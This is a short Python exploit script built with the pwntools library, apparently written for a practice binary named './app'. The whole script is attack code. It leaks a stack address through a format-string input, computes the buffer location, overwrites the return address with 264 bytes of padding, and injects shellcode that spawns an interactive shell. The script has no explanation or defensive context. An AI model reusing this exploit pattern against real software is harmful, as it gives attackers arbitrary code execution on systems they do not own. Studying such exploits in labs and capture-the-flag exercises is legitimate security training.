from pwn  import *
import struct

context.arch='amd64' #specify architecture here
io = process('./app')
raw_input("Press return to continue... ")
(io.recvregex(b':'))
info ("Relaying Format String...")
io.sendline(b'%p,%p,%p')
io.recvline()
leak=io.recvline().split(b',')[1]
io.recvregex(b':')
start_buf=(int(leak,16))+264-9 #rip_offset
info("Leaked start of buffer: 0x{:08x}".format(start_buf))
padding=b'a'*264
RIP=struct.pack(b'Q',start_buf+8)
shellcode=asm(shellcraft.amd64.linux.sh())
payload=padding+RIP+shellcode
info('Injecting Exploit')
io.sendline(payload)
io.interactive()

